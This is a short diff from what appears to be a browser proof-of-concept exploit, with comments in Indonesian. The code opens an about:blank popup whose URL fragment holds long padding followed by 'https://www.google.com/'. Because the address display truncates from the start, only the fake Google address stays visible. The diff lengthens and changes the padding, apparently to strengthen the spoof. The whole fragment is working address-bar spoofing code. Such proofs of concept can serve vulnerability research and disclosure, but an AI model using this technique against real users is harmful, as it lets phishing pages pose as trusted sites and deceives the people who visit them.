@@ -15,7 +15,7 @@
                     // Klik pertama: buka popup about:blank dengan fragment yang berisi URL palsu
                     // Inti kerentanan: host about:blank kosong, getUrlString() fallback ke seluruh spec
                     // TruncateAt.START memotong awal, hanya menyisakan …https://www.google.com/
-                    const padding = '/'.repeat(300);
+                    const padding = '.?----'.repeat(900);
                     const spoofedUrl = 'https://www.google.com/';
                     const payload = padding + spoofedUrl;
                     const popup = window.open('about:blank#' + payload, 'poc', 'width=400,height=400');
